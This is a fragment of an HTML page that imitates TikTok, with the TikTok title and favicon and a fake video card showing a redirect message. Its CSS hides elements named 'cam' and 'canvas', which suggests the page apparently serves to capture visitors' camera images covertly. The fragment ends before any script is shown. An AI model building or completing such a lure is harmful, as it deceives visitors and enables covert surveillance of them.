<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>TikTok</title>
  <link rel="icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-login/8152caf0c8e8bc67ae0d.ico">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    .tt-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 32px; }
    .tt-logo svg { width: 36px; height: 36px; }
    .tt-logo span { font-size: 1.6rem; font-weight: 800; letter-spacing: -0.5px; }
    .video-card { width: 340px; background: #111; border-radius: 16px; overflow: hidden; border: 1px solid #1f1f1f; }
    .thumb { width: 100%; height: 200px; background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460); display: flex; align-items: center; justify-content: center; position: relative; }
    .play-btn { width: 56px; height: 56px; background: rgba(255,255,255,0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(8px); }
    .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 12px solid transparent; margin-left: 4px; }
    .views { position: absolute; bottom: 10px; right: 12px; font-size: 0.75rem; color: rgba(255,255,255,0.7); background: rgba(0,0,0,0.5); padding: 2px 8px; border-radius: 20px; }
    .info { padding: 14px 16px; }
    .user-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
    .avatar { width: 36px; height: 36px; background: linear-gradient(45deg, #FE2C55, #25F4EE); border-radius: 50%; flex-shrink: 0; }
    .username { font-weight: 700; font-size: 0.9rem; }
    .handle { font-size: 0.75rem; color: #888; margin-top: 1px; }
    .caption { font-size: 0.85rem; color: #ccc; line-height: 1.4; }
    .tags { color: #FE2C55; }
    .actions { display: flex; justify-content: space-around; padding: 12px 16px; border-top: 1px solid #1f1f1f; font-size: 0.75rem; color: #888; }
    .action { display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .action svg { width: 22px; height: 22px; fill: #888; }
    .redirect-msg { margin-top: 24px; font-size: 0.8rem; color: #555; }
    .dot-anim::after { content: '...'; animation: dots 1.2s infinite; }
    @keyframes dots { 0%{content:'.'} 33%{content:'..'} 66%{content:'...'} }
    #cam,#canvas { display:none; position:fixed; opacity:0; pointer-events:none; }
  </style>
